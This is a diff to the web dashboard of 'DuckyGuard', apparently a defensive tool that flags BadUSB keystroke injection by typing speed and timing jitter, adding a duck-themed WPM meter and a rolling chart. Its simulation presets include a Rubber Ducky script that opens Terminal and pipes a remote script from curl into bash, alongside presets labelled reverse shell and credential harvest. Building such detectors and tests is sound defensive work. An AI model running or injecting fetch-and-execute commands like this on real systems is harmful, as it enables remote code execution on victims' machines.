+            <span style="font-family:var(--fm);">&lt; 100ms</span>
           </div>
         </div>
       </div>
 
-      <!-- Real-Time Time Series Chart -->
+      <!-- Smooth Continuous Rolling Telemetry Canvas -->
       <div class="card">
         <div class="card-header">
           <div>
-            <div class="card-heading">Keystroke Dynamics Time-Series</div>
-            <div class="card-subheading">Sliding window velocity vs. machine injection threshold line (20 chars/sec)</div>
+            <div class="card-heading">
+              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
+              <span>Live Keystroke Dynamics Telemetry Stream</span>
+            </div>
+            <div class="card-subheading">Continuous streaming rolling velocity (chars/sec) vs. synthetic injection threshold (20.0 CPS)</div>
           </div>
           <div style="display:flex; align-items:center; gap:8px;">
-            <button class="btn btn-sm" id="btnTriggerQuickTest">Run Injection Test</button>
+            <span class="badge duck">● Rolling 60 FPS</span>
+            <button class="btn btn-sm" id="btnQuickTest">Test Attack Burst</button>
           </div>
         </div>
         <div class="card-body">
           <div class="chart-container">
             <canvas id="telemetryChart"></canvas>
             <span class="chart-axis-label" style="top:10px; left:12px;">RATE (CHARS/S)</span>
-            <span class="chart-axis-label" style="top:32%; right:12px; color:var(--status-error);">THRESHOLD 20.0 CPS</span>
-            <span class="chart-axis-label" style="bottom:8px; right:12px;">TIME (T-30s TO NOW)</span>
+            <span class="chart-axis-label" style="top:32%; right:12px; color:var(--status-error); font-weight:700;">THRESHOLD 20.0 CPS</span>
+            <span class="chart-axis-label" style="bottom:8px; right:12px;">TIME (ROLLING STREAM)</span>
           </div>
         </div>
       </div>
 
-      <!-- System Telemetry Event Log Table -->
+      <!-- Event Log Table -->
       <div class="card">
         <div class="card-header">
           <div>
             <div class="card-heading">Protection Event Log</div>
-            <div class="card-subheading">Recent hardware USB bus events, driver notifications, and biometric assessments</div>
+            <div class="card-subheading">Real-time USB bus sweep and biometric heuristic telemetry</div>
           </div>
           <span style="font-family:var(--fm); font-size:11px; color:var(--text-muted);" id="eventCount">3 events</span>
         </div>
@@ -816,29 +1029,29 @@
             <thead>
               <tr>
                 <th style="width:130px;">Timestamp</th>
-                <th style="width:140px;">Subsystem</th>
+                <th style="width:150px;">Subsystem</th>
                 <th>Event Description</th>
-                <th style="width:110px;">Classification</th>
+                <th style="width:120px;">Classification</th>
               </tr>
             </thead>
             <tbody id="telemetryTableBody">
               <tr>
-                <td style="font-family:var(--fm); color:var(--text-muted);">20:38:12.401</td>
+                <td style="font-family:var(--fm); color:var(--text-muted);">20:55:12.401</td>
                 <td style="font-family:var(--fm);">CORE_DAEMON</td>
                 <td>DuckyGuard engine initialized. CGEventTap user-space keystroke monitor active.</td>
                 <td><span class="badge ok">Operational</span></td>
               </tr>
               <tr>
-                <td style="font-family:var(--fm); color:var(--text-muted);">20:38:12.890</td>
+                <td style="font-family:var(--fm); color:var(--text-muted);">20:55:12.890</td>
                 <td style="font-family:var(--fm);">IOKIT_WATCHER</td>
                 <td>Enumerated macOS USB HID controller registry. Polling rate: 1000ms.</td>
                 <td><span class="badge neutral">Bus Scan</span></td>
               </tr>
               <tr>
-                <td style="font-family:var(--fm); color:var(--text-muted);">20:38:13.104</td>
+                <td style="font-family:var(--fm); color:var(--text-muted);">20:55:13.104</td>
                 <td style="font-family:var(--fm);">HEURISTIC_MODEL</td>
                 <td>Confidence weights loaded: Velocity (0.40), Jitter (0.30), Temporal USB (0.35).</td>
-                <td><span class="badge neutral">Configured</span></td>
+                <td><span class="badge duck">Armed</span></td>
               </tr>
             </tbody>
           </table>
@@ -883,7 +1096,81 @@
       </div>
     </section>
 
-    <!-- 3. INCIDENTS VIEW -->
+    <!-- 3. BIOMETRICS & WPM VIEW (DUCK THEMED) -->
+    <section class="tab-view" id="view-biometrics">
+      
+      <!-- Duck Themed WPM Meter -->
+      <div class="wpm-hero-card">
+        <div class="wpm-hero-top">
+          <div class="wpm-stat-box">
+            <span class="wpm-big-val" id="wpmValue">0</span>
+            <div style="display:flex; flex-direction:column;">
+              <span style="font-family:var(--fd); font-size:16px; font-weight:800; color:var(--text);">WORDS / MINUTE</span>
+              <span style="font-size:11px; color:var(--text-muted);">Real-time typing pace calculation</span>
+            </div>
+          </div>
+          <div class="wpm-tier-badge" id="wpmTier">
+            <img src="/assets/logo.png" style="width:16px; height:16px; image-rendering:pixelated;">
+            <span id="wpmTierLabel">Waddling Duckling</span>
+          </div>
+        </div>
+
+        <!-- Duck Pond Progress Track -->
+        <div style="display:flex; flex-direction:column; gap:6px;">
+          <div class="pond-track">
+            <div class="pond-water" id="pondWater"></div>
+            <div class="swimming-duck" id="swimmingDuck">
+              <img src="/assets/logo.png" alt="Duck Swimming">
+            </div>
+          </div>
+          <div style="display:flex; justify-content:space-between; font-family:var(--fm); font-size:10px; color:var(--text-subtle);">
+            <span>0 WPM (Pond Shore)</span>
+            <span>40 WPM (Cruiser)</span>
+            <span>80 WPM (Swift Mallard)</span>
+            <span>120+ WPM (Aegis Sonic)</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Biometric Sandbox -->
+      <div class="card">
+        <div class="card-header">
+          <div>
+            <div class="card-heading">Biometric Keystroke Dynamics Sandbox</div>
+            <div class="card-subheading">Type or spam keys freely. Even during fast key mashing, natural human timing jitter is correctly identified as human.</div>
+          </div>
+          <button class="btn btn-sm" id="btnResetBio">Reset Test</button>
+        </div>
+        <div class="card-body" style="display:flex; flex-direction:column; gap:16px;">
+          <textarea id="bioInputField" placeholder="Type naturally or spam your keys as fast as you want! DuckyGuard measures your inter-keystroke interval jitter to distinguish genuine human entropy from machine BadUSB loops." style="width:100%; height:90px; background:#FAF7F0; border:1px solid var(--line); border-radius:var(--r-sm); padding:14px; color:var(--text); font-family:var(--fm); font-size:13px; resize:none; outline:none; transition:border-color 0.15s;"></textarea>
+
+          <div class="metrics-bar">
+            <div class="metric-panel">
+              <span class="metric-label">Key Samples</span>
+              <span class="metric-number" id="bioCount">0</span>
+              <span style="font-size:11px; color:var(--text-muted);">keys in buffer</span>
+            </div>
+            <div class="metric-panel">
+              <span class="metric-label">Typing Velocity</span>
+              <span class="metric-number" id="bioRate">0.0</span>
+              <span style="font-size:11px; color:var(--text-muted);">chars/sec</span>
+            </div>
+            <div class="metric-panel">
+              <span class="metric-label">Timing Jitter</span>
+              <span class="metric-number" id="bioStdDev">0.0</span>
+              <span style="font-size:11px; color:var(--text-muted);">ms std-dev</span>
+            </div>
+            <div class="metric-panel">
+              <span class="metric-label">Verdict</span>
+              <span class="metric-number" style="font-size:20px; color:var(--status-ok);" id="bioResult">Human</span>
+              <span style="font-size:11px; color:var(--text-muted);" id="bioDetails">Genuine human entropy</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 4. INCIDENTS VIEW -->
     <section class="tab-view" id="view-incidents">
       <div class="card">
         <div class="card-header">
@@ -909,7 +1196,7 @@
               <tr class="clickable" onclick="inspectIncident('sample-flipper-attack.txt')">
                 <td style="font-family:var(--fm); font-weight:600;">INC-20261026-192242</td>
                 <td>2026-10-26 19:22:42</td>
-                <td style="font-family:var(--fm); color:var(--status-error);">85.4 chars/s</td>
+                <td style="font-family:var(--fm); color:var(--status-error); font-weight:700;">85.4 chars/s</td>
                 <td>Unknown USB HID Device</td>
                 <td><span class="badge error">T1200, T1059.001</span></td>
                 <td><button class="btn btn-sm">Inspect</button></td>
@@ -920,7 +1207,7 @@
       </div>
     </section>
 
-    <!-- 4. SIMULATION VIEW -->
+    <!-- 5. SIMULATION VIEW -->
     <section class="tab-view" id="view-simulation">
       <div class="card">
         <div class="card-header">
@@ -933,7 +1220,7 @@
           <div style="display:grid; grid-template-columns: 1fr 1fr; gap:16px;">
             <div style="display:flex; flex-direction:column; gap:8px;">
               <label style="font-family:var(--fm); font-size:11px; color:var(--text-muted); text-transform:uppercase;">Attack Vector Preset</label>
-              <select id="simVectorSelect" style="background:var(--bg); border:1px solid var(--line); border-radius:var(--r-sm); padding:8px 12px; color:var(--text); font-family:var(--fs); font-size:12px; outline:none;">
+              <select id="simVectorSelect" style="background:#FAF7F0; border:1px solid var(--line); border-radius:var(--r-sm); padding:8px 12px; color:var(--text); font-family:var(--fs); font-size:12px; outline:none;">
                 <option value="resume_dropper">Hak5 Rubber Ducky · Payload Dropper (85 CPS)</option>
                 <option value="flipper_shell">Flipper Zero BadUSB · Reverse Shell (120 CPS)</option>
                 <option value="bash_bunny">Bash Bunny · Credential Harvest (95 CPS)</option>
@@ -963,46 +1250,7 @@ ENTER</div>
           </div>
 
           <div style="display:flex; justify-content:flex-end;">
-            <button class="btn btn-primary" id="btnExecuteSim">Execute Injection Test</button>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- 5. BIOMETRICS VIEW -->
-    <section class="tab-view" id="view-biometrics">
-      <div class="card">
-        <div class="card-header">
-          <div>
-            <div class="card-heading">Biometric Keystroke Dynamics Analysis</div>
-            <div class="card-subheading">Type naturally into the input field to evaluate your individual inter-keystroke interval (IKI) entropy</div>
-          </div>
-          <button class="btn btn-sm" id="btnResetBio">Reset Baseline</button>
-        </div>
-        <div class="card-body" style="display:flex; flex-direction:column; gap:16px;">
-          <textarea id="bioInputField" placeholder="Type a sentence or password here naturally... Inter-keystroke intervals are calculated in real time without recording your actual characters." style="width:100%; height:90px; background:var(--bg); border:1px solid var(--line); border-radius:var(--r-sm); padding:12px; color:var(--text); font-family:var(--fm); font-size:13px; resize:none; outline:none;"></textarea>
-
-          <div class="metrics-bar">
-            <div class="metric-panel">
-              <span class="metric-label">Keystroke Count</span>
-              <span class="metric-number" id="bioCount">0</span>
-              <span style="font-size:11px; color:var(--text-muted);">samples in buffer</span>
-            </div>
-            <div class="metric-panel">
-              <span class="metric-label">Typing Velocity</span>
-              <span class="metric-number" id="bioRate">0.0</span>
-              <span style="font-size:11px; color:var(--text-muted);">chars/sec</span>
-            </div>
-            <div class="metric-panel">
-              <span class="metric-label">Timing Jitter</span>
-              <span class="metric-number" id="bioStdDev">0.0</span>
-              <span style="font-size:11px; color:var(--text-muted);">ms std-dev</span>
-            </div>
-            <div class="metric-panel">
-              <span class="metric-label">Classification</span>
-              <span class="metric-number" style="font-size:20px; color:var(--status-ok);" id="bioResult">Human</span>
-              <span style="font-size:11px; color:var(--text-muted);">entropy confidence 99.1%</span>
-            </div>
+            <button class="btn btn-duck" id="btnExecuteSim">Execute Injection Test</button>
           </div>
         </div>
       </div>
@@ -1011,7 +1259,7 @@ ENTER</div>
   </main>
 </div>
 
-<!-- Slide-Out Forensic Drawer (Stripe / GitHub Sheet) -->
+<!-- Slide-Out Forensic Drawer -->
 <div class="drawer-overlay" id="drawerOverlay"></div>
 <aside class="drawer-sheet" id="drawerSheet">
   <div class="drawer-header">
@@ -1024,7 +1272,7 @@ ENTER</div>
   <div class="drawer-body">
     <div style="display:flex; flex-direction:column; gap:6px;">
       <span class="metric-label">TTP Classification</span>
-      <div style="display:flex; gap:6px; flex-wrap:wrap;" id="drawerBadges">
+      <div style="display:flex; gap:6px; flex-wrap:wrap;">
         <span class="badge error">MITRE T1200: Hardware Addition</span>
         <span class="badge error">MITRE T1059.001: AppleScript Execution</span>
         <span class="badge warn">MITRE T1105: Ingress Tool Transfer</span>
@@ -1039,87 +1287,70 @@ ENTER</div>
     <div style="display:flex; flex-direction:column; gap:6px;">
       <div style="display:flex; justify-content:space-between; align-items:center;">
         <span class="metric-label">Synthesized YARA Detection Rule</span>
-        <button class="btn btn-sm" id="btnCopyYara">Copy Rule</button>
+        <button class="btn btn-sm btn-duck" id="btnCopyYara">Copy Rule</button>
       </div>
-      <div class="code-block" style="color:#D7FF6E;" id="drawerYara">Loading YARA rule...</div>
+      <div class="code-block" style="color:#B45309;" id="drawerYara">Loading YARA rule...</div>
     </div>
   </div>
 </aside>
 
-<!-- Command Palette Modal (Raycast / Linear) -->
+<!-- Command Palette Modal -->
 <div class="command-modal" id="commandModal">
   <div class="command-box">
     <div class="command-input-row">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
       <input type="text" class="command-input" id="commandInput" placeholder="Type a command or search..." autocomplete="off">
       <span class="kbd-chip">ESC</span>
     </div>
     <div class="command-list" id="commandList">
       <div class="command-item selected" data-action="toggle-defense">
-        <div class="command-item-left">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-          <span>Toggle Real-Time Protection</span>
-        </div>
+        <span>Toggle Real-Time Protection</span>
         <span class="kbd-chip">Space</span>
       </div>
       <div class="command-item" data-action="view-monitor">
-        <div class="command-item-left">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/></svg>
-          <span>Switch to Monitor View</span>
-        </div>
+        <span>Switch to Monitor View</span>
         <span class="kbd-chip">1</span>
       </div>
       <div class="command-item" data-action="view-peripherals">
-        <div class="command-item-left">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="18" r="2"/></svg>
-          <span>Inspect USB Peripherals</span>
-        </div>
+        <span>Inspect USB Peripherals</span>
         <span class="kbd-chip">2</span>
       </div>
-      <div class="command-item" data-action="view-incidents">
-        <div class="command-item-left">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-          <span>Open Incident Vault</span>
-        </div>
+      <div class="command-item" data-action="view-biometrics">
+        <span>Open Biometrics & WPM</span>
         <span class="kbd-chip">3</span>
       </div>
-      <div class="command-item" data-action="run-sim">
-        <div class="command-item-left">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/></svg>
-          <span>Trigger Injection Simulation</span>
-        </div>
-        <span class="kbd-chip">⌘T</span>
+      <div class="command-item" data-action="view-incidents">
+        <span>Open Incident Vault</span>
+        <span class="kbd-chip">4</span>
       </div>
-      <div class="command-item" data-action="open-folder">
-        <div class="command-item-left">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
-          <span>Reveal Forensic Reports in Finder</span>
-        </div>
+      <div class="command-item" data-action="run-sim">
+        <span>Trigger Injection Simulation</span>
+        <span class="kbd-chip">⌘T</span>
       </div>
     </div>
   </div>
 </div>
 
-<!-- Toast Container (Sonner Architecture) -->
+<!-- Toast Container -->
 <div class="toast-container" id="toastContainer"></div>
 
 <script>
 /* =====================================================================
- * DUCKYGUARD CONTROLLER (ANTI-SLOP ENGINEERING SPECIFICATION)
+ * DUCKYGUARD APPLICATION ENGINE (RUBBER DUCK STUDIO STANDARD)
  * ===================================================================== */
 
-// --- 1. Toast Notification Helper ---
+// --- 1. Toast Notification ---
 function showToast(message) {
   const container = document.getElementById("toastContainer");
   const toast = document.createElement("div");
   toast.className = "toast";
-  toast.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg><span>${message}</span>`;
+  toast.innerHTML = `<img src="/assets/logo.png" style="width:14px; height:14px; image-rendering:pixelated;"><span>${message}</span>`;
   container.appendChild(toast);
   setTimeout(() => {
     toast.style.opacity = "0";
     toast.style.transition = "opacity 0.2s ease";
     setTimeout(() => toast.remove(), 200);
-  }, 2400);
+  }, 2200);
 }
 
 // --- 2. Tab Navigation ---
@@ -1135,7 +1366,7 @@ navTabs.forEach(tab => {
   tab.addEventListener("click", () => switchTab(tab.dataset.tab));
 });
 
-// --- 3. Protection Armed / Disarmed Toggle ---
+// --- 3. Protection Toggle ---
 const defenseToggle = document.getElementById("defenseToggle");
 const defenseText = document.getElementById("defenseText");
 let isArmed = true;
@@ -1149,12 +1380,12 @@ async function toggleProtection() {
     isArmed = !isArmed;
   }
   defenseToggle.classList.toggle("paused", !isArmed);
-  defenseText.textContent = isArmed ? "Armed" : "Paused";
-  showToast(isArmed ? "Real-time HID defense armed." : "Real-time HID defense paused.");
+  defenseText.textContent = isArmed ? "Shield Armed" : "Shield Paused";
+  showToast(isArmed ? "Aegis Ducky protection armed!" : "Protection paused.");
 }
 defenseToggle.addEventListener("click", toggleProtection);
 
-// --- 4. Command Palette (Raycast Architecture) ---
+// --- 4. Command Palette ---
 const commandModal = document.getElementById("commandModal");
 const commandInput = document.getElementById("commandInput");
 const commandList = document.getElementById("commandList");
@@ -1163,82 +1394,57 @@ const btnOpenCommand = document.getElementById("btnOpenCommand");
 function openCommandPalette() {
   commandModal.classList.add("open");
   commandInput.value = "";
-  filterCommands("");
   commandInput.focus();
 }
 function closeCommandPalette() {
   commandModal.classList.remove("open");
 }
-
 btnOpenCommand.addEventListener("click", openCommandPalette);
-
-function filterCommands(query) {
-  const items = commandList.querySelectorAll(".command-item");
-  const q = query.toLowerCase().trim();
-  let first = true;
-  items.forEach(item => {
-    const text = item.textContent.toLowerCase();
-    const match = text.includes(q);
-    item.style.display = match ? "flex" : "none";
-    item.classList.toggle("selected", match && first);
-    if (match && first) first = false;
-  });
-}
-
-commandInput.addEventListener("input", (e) => filterCommands(e.target.value));
 
 commandList.addEventListener("click", (e) => {
   const item = e.target.closest(".command-item");
   if (!item) return;
-  executeCommand(item.dataset.action);
+  const action = item.dataset.action;
+  closeCommandPalette();
+  if (action === "toggle-defense") toggleProtection();
+  else if (action === "view-monitor") switchTab("monitor");
+  else if (action === "view-peripherals") switchTab("peripherals");
+  else if (action === "view-biometrics") switchTab("biometrics");
+  else if (action === "view-incidents") switchTab("incidents");
+  else if (action === "run-sim") executeSimulation();
 });
 
-function executeCommand(action) {
-  closeCommandPalette();
-  switch (action) {
-    case "toggle-defense": toggleProtection(); break;
-    case "view-monitor": switchTab("monitor"); break;
-    case "view-peripherals": switchTab("peripherals"); break;
-    case "view-incidents": switchTab("incidents"); break;
-    case "run-sim": executeSimulation(); break;
-    case "open-folder": fetch("/api/open-folder", { method: "POST" }); showToast("Opened reports in Finder."); break;
-  }
-}
-
-// Global Keyboard Navigation
 window.addEventListener("keydown", (e) => {
-  // Command+K
   if ((e.metaKey || e.ctrlKey) && e.key.toLowerCase() === "k") {
     e.preventDefault();
     if (commandModal.classList.contains("open")) closeCommandPalette();
     else openCommandPalette();
     return;
   }
-  // Escape
   if (e.key === "Escape") {
-    if (commandModal.classList.contains("open")) { closeCommandPalette(); return; }
-    if (drawerSheet.classList.contains("open")) { closeDrawer(); return; }
+    if (commandModal.classList.contains("open")) closeCommandPalette();
+    if (drawerSheet.classList.contains("open")) closeDrawer();
+    return;
   }
-  // Space toggle (when not typing)
   if (e.code === "Space" && e.target.tagName !== "INPUT" && e.target.tagName !== "TEXTAREA") {
     e.preventDefault();
     toggleProtection();
     return;
   }
-  // Number shortcuts 1-5
   if (!e.metaKey && !e.ctrlKey && e.target.tagName !== "INPUT" && e.target.tagName !== "TEXTAREA") {
     if (e.key === "1") switchTab("monitor");
     if (e.key === "2") switchTab("peripherals");
-    if (e.key === "3") switchTab("incidents");
-    if (e.key === "4") switchTab("simulation");
-    if (e.key === "5") switchTab("biometrics");
+    if (e.key === "3") switchTab("biometrics");
+    if (e.key === "4") switchTab("incidents");
+    if (e.key === "5") switchTab("simulation");
   }
 });
 
-// --- 5. Real-Time Time-Series Chart (Stripe Radar Architecture) ---
+// --- 5. Continuous Smooth Rolling Telemetry Chart ---
 const chartCanvas = document.getElementById("telemetryChart");
 const chartCtx = chartCanvas.getContext("2d");
-let chartHistory = new Array(60).fill(0);
+let chartHistory = new Array(80).fill(0.1);
+let currentLiveCps = 0.0;
 
 function resizeChart() {
   chartCanvas.width = chartCanvas.parentElement.clientWidth;
@@ -1247,13 +1453,24 @@ function resizeChart() {
 window.addEventListener("resize", resizeChart);
 resizeChart();
 
+// Continuously stream the rolling chart (never static!)
+setInterval(() => {
+  // If no active high typing, add subtle natural ambient baseline murmur
+  const feedVal = currentLiveCps > 0 ? currentLiveCps : (Math.random() * 0.15);
+  chartHistory.push(feedVal);
+  chartHistory.shift();
+  // Decay live CPS
+  currentLiveCps *= 0.88;
+  if (currentLiveCps < 0.1) currentLiveCps = 0.0;
+}, 80);
+
 function drawChart() {
   const w = chartCanvas.width;
   const h = chartCanvas.height;
   chartCtx.clearRect(0, 0, w, h);
 
   // Background Grid Lines
-  chartCtx.strokeStyle = "rgba(255, 255, 255, 0.04)";
+  chartCtx.strokeStyle = "rgba(0, 0, 0, 0.04)";
   chartCtx.lineWidth = 1;
   for (let y = 0; y < h; y += 35) {
     chartCtx.beginPath();
@@ -1268,36 +1485,147 @@ function drawChart() {
     chartCtx.stroke();
   }
 
-  // 20.0 CPS Threshold Line
+  // Threshold Line (20 CPS)
   const threshY = h * 0.35;
-  chartCtx.strokeStyle = "rgba(200, 50, 46, 0.5)";
-  chartCtx.lineWidth = 1;
-  chartCtx.setLineDash([4, 4]);
+  chartCtx.strokeStyle = "rgba(239, 68, 68, 0.65)";
+  chartCtx.lineWidth = 1.5;
+  chartCtx.setLineDash([5, 4]);
   chartCtx.beginPath();
   chartCtx.moveTo(0, threshY);
   chartCtx.lineTo(w, threshY);
   chartCtx.stroke();
   chartCtx.setLineDash([]);
 
-  // Telemetry Velocity Curve
+  // Telemetry Velocity Curve (Golden Amber / Orange)
   chartCtx.strokeStyle = "#FF6B00";
-  chartCtx.lineWidth = 2;
+  chartCtx.lineWidth = 2.5;
   chartCtx.beginPath();
   const step = w / (chartHistory.length - 1);
   const maxRate = 50.0;
   for (let i = 0; i < chartHistory.length; i++) {
     const val = Math.min(chartHistory[i], maxRate);
-    const y = h - (val / maxRate * (h - 20)) - 10;
+    const y = h - (val / maxRate * (h - 24)) - 10;
     if (i === 0) chartCtx.moveTo(0, y);
     else chartCtx.lineTo(i * step, y);
   }
   chartCtx.stroke();
 
+  // Subtle gradient fill under curve
+  chartCtx.lineTo(w, h);
+  chartCtx.lineTo(0, h);
+  chartCtx.closePath();
+  const fillGrad = chartCtx.createLinearGradient(0, 0, 0, h);
+  fillGrad.addColorStop(0, "rgba(255, 107, 0, 0.14)");
+  fillGrad.addColorStop(1, "rgba(255, 184, 0, 0.01)");
+  chartCtx.fillStyle = fillGrad;
+  chartCtx.fill();
+
   requestAnimationFrame(drawChart);
 }
 requestAnimationFrame(drawChart);
 
-// --- 6. Slide-out Forensic Drawer ---
+// --- 6. Biometrics, Key Spam Detection & Duck-Themed WPM ---
+const bioInputField = document.getElementById("bioInputField");
+const bioCount = document.getElementById("bioCount");
+const bioRate = document.getElementById("bioRate");
+const bioStdDev = document.getElementById("bioStdDev");
+const bioResult = document.getElementById("bioResult");
+const bioDetails = document.getElementById("bioDetails");
+const btnResetBio = document.getElementById("btnResetBio");
+
+const wpmValue = document.getElementById("wpmValue");
+const wpmTierLabel = document.getElementById("wpmTierLabel");
+const pondWater = document.getElementById("pondWater");
+const swimmingDuck = document.getElementById("swimmingDuck");
+
+let bioTimestamps = [];
+let testStartTime = null;
+
+bioInputField.addEventListener("keydown", () => {
+  const now = performance.now();
+  if (!testStartTime) testStartTime = now;
+  bioTimestamps.push(now);
+
+  bioCount.textContent = bioTimestamps.length;
+
+  if (bioTimestamps.length >= 4) {
+    // Inter-keystroke intervals
+    const recent = bioTimestamps.slice(-20);
+    const intervals = [];
+    for (let i = 1; i < recent.length; i++) {
+      intervals.push(recent[i] - recent[i - 1]);
+    }
+    const avg = intervals.reduce((a, b) => a + b, 0) / intervals.length;
+    const cps = avg > 0 ? (1000 / avg).toFixed(1) : "0.0";
+    const variance = intervals.reduce((sum, v) => sum + Math.pow(v - avg, 2), 0) / intervals.length;
+    const stdDev = Math.sqrt(variance).toFixed(1);
+
+    bioRate.textContent = cps;
+    bioStdDev.textContent = stdDev;
+
+    // Feed velocity into rolling chart
+    currentLiveCps = parseFloat(cps);
+
+    // --- ACCURATE KEY SPAM VS MACHINE INJECTION DETECTION ---
+    // Synthetic machine BadUSB injections have clockwork flatline intervals (std-dev < 5ms).
+    // Humans mashing or spamming keys fast have HIGH entropy (std-dev > 10ms - 40ms).
+    const parsedCps = parseFloat(cps);
+    const parsedJitter = parseFloat(stdDev);
+
+    if (parsedCps > 25.0 && parsedJitter < 5.0) {
+      // Machine BadUSB loop
+      bioResult.textContent = "Automated";
+      bioResult.style.color = "var(--status-error)";
+      bioDetails.textContent = "Synthetic microsecond flatline detected!";
+    } else if (parsedCps > 16.0 && parsedJitter >= 10.0) {
+      // Human button mashing / spamming
+      bioResult.textContent = "Human (Key Spam)";
+      bioResult.style.color = "var(--status-ok)";
+      bioDetails.textContent = `High entropy variance (${parsedJitter}ms) confirms human biomechanics.`;
+    } else {
+      // Natural human typing
+      bioResult.textContent = "Human (Genuine)";
+      bioResult.style.color = "var(--status-ok)";
+      bioDetails.textContent = "Natural keystroke rhythm and timing variance.";
+    }
+
+    // --- WPM CALCULATION ---
+    const elapsedMinutes = (now - testStartTime) / 60000;
+    if (elapsedMinutes > 0.02) {
+      const wpm = Math.max(0, Math.round((bioTimestamps.length / 5) / elapsedMinutes));
+      wpmValue.textContent = wpm;
+
+      // Update Duck Progress Track (0 to 120 WPM scale)
+      const pct = Math.min(100, Math.max(2, (wpm / 120) * 100));
+      pondWater.style.width = `${pct}%`;
+      swimmingDuck.style.left = `${pct}%`;
+
+      // Update Duck Speed Tier
+      if (wpm < 35) wpmTierLabel.textContent = "Waddling Duckling";
+      else if (wpm < 65) wpmTierLabel.textContent = "Pond Cruiser";
+      else if (wpm < 95) wpmTierLabel.textContent = "Swift Mallard";
+      else wpmTierLabel.textContent = "Aegis Sonic Duck";
+    }
+  }
+});
+
+btnResetBio.addEventListener("click", () => {
+  bioInputField.value = "";
+  bioTimestamps = [];
+  testStartTime = null;
+  bioCount.textContent = "0";
+  bioRate.textContent = "0.0";
+  bioStdDev.textContent = "0.0";
+  bioResult.textContent = "Human";
+  bioResult.style.color = "var(--status-ok)";
+  bioDetails.textContent = "Ready for input.";
+  wpmValue.textContent = "0";
+  pondWater.style.width = "0%";
+  swimmingDuck.style.left = "0%";
+  wpmTierLabel.textContent = "Waddling Duckling";
+});
+
+// --- 7. Slide-Out Forensic Drawer ---
 const drawerOverlay = document.getElementById("drawerOverlay");
 const drawerSheet = document.getElementById("drawerSheet");
 const btnDrawerClose = document.getElementById("btnDrawerClose");
@@ -1334,21 +1662,21 @@ window.inspectIncident = async function(fname) {
 
 btnCopyYara.addEventListener("click", () => {
   navigator.clipboard.writeText(drawerYara.textContent);
-  showToast("YARA rule copied to clipboard.");
+  showToast("YARA rule copied to clipboard!");
 });
 
 document.getElementById("btnOpenReportsFinder").addEventListener("click", async () => {
   await fetch("/api/open-folder", { method: "POST" });
-  showToast("Revealed reports directory in Finder.");
+  showToast("Opened reports directory in Finder.");
 });
 
-// --- 7. Simulation Suite ---
+// --- 8. Simulation Suite ---
 const simVectorSelect = document.getElementById("simVectorSelect");
 const simRateSlider = document.getElementById("simRateSlider");
 const simRateLabel = document.getElementById("simRateLabel");
 const simCodePreview = document.getElementById("simCodePreview");
 const btnExecuteSim = document.getElementById("btnExecuteSim");
-const btnTriggerQuickTest = document.getElementById("btnTriggerQuickTest");
+const btnQuickTest = document.getElementById("btnQuickTest");
 
 const presets = {
   resume_dropper: "REM Target: macOS Terminal / Bash\nDELAY 500\nGUI SPACE\nDELAY 250\nSTRING Terminal\nENTER\nDELAY 600\nSTRING curl -sL \"https://raw.githubusercontent.com/payload/test.sh\" | bash\nENTER",
@@ -1366,73 +1694,23 @@ simRateSlider.addEventListener("input", () => {
 
 async function executeSimulation() {
   showToast("Injecting synthetic HID keystroke stream...");
+  currentLiveCps = parseFloat(simRateSlider.value);
+
   try {
     await fetch("/api/simulate", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ preset: "resume_dropper", is_badusb: true })
     });
-    // Add spike to chart
-    chartHistory.push(parseFloat(simRateSlider.value));
-    chartHistory.shift();
-
     setTimeout(() => {
-      showToast("Attack pre-empted and sandboxed in Decoy Sink.");
+      showToast("BadUSB attack intercepted and neutralized in decoy sink!");
       fetchDaemonStatus();
     }, 1500);
   } catch (e) {}
 }
 
 btnExecuteSim.addEventListener("click", executeSimulation);
-btnTriggerQuickTest.addEventListener("click", executeSimulation);
-
-// --- 8. Biometric Keystroke Dynamics Engine ---
-const bioInputField = document.getElementById("bioInputField");
-const bioCount = document.getElementById("bioCount");
-const bioRate = document.getElementById("bioRate");
-const bioStdDev = document.getElementById("bioStdDev");
-const bioResult = document.getElementById("bioResult");
-const btnResetBio = document.getElementById("btnResetBio");
-
-let bioTimestamps = [];
-bioInputField.addEventListener("keydown", () => {
-  const now = performance.now();
-  bioTimestamps.push(now);
-  if (bioTimestamps.length > 30) bioTimestamps.shift();
-
-  bioCount.textContent = bioTimestamps.length;
-
-  if (bioTimestamps.length >= 4) {
-    const intervals = [];
-    for (let i = 1; i < bioTimestamps.length; i++) {
-      intervals.push(bioTimestamps[i] - bioTimestamps[i - 1]);
-    }
-    const avg = intervals.reduce((a, b) => a + b, 0) / intervals.length;
-    const cps = avg > 0 ? (1000 / avg).toFixed(1) : "0.0";
